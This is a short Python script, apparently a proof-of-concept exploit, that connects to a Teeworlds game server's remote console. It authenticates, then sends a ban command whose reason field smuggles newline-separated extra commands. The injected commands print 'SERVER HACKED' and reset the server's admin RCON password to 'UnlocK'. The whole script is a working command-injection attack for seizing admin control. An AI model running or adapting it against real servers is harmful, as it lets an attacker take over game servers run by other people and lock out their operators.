from teeworlds_library_py import Client
import asyncio

profile = {
    "identity": {
        "name": "Test",
        "clan": "",
        "country": -1,
        "skin": "default",
        "use_custom_color": 0,
        "color_body": 0,
        "color_feet": 0,
    },
}

client = Client("127.0.0.1", 8303, "Test", profile)

@client.on("connected")
def process_connected():
    print("Connected to server")
    client.rcon.auth("test")
    client.Flush()

@client.on("rcon_auth_status")
def process_rcon_auth_status(data):
    if data.get("AuthLevel", 0) > 0:
        print("RCON authenticated")
        command = 'ban 1.1.1.1 100 my_reson\necho "!!! SERVER HACKED !!!"\necho "=== RCON (admin) PASS: UnlocK ==="\nsv_rcon_password "UnlocK"'
        client.rcon.rcon(command)
    else:
        print("RCON authentication failed")

@client.on("rcon_line")
def process_rcon_line(msg):
    print(f"[RCON] {msg}")

@client.on("disconnect")
def process_disconnect(msg):
    print(f"Disconnected. Reason: {msg}")

async def main():
    await client.connect()

if __name__ == "__main__":
    asyncio.run(main())
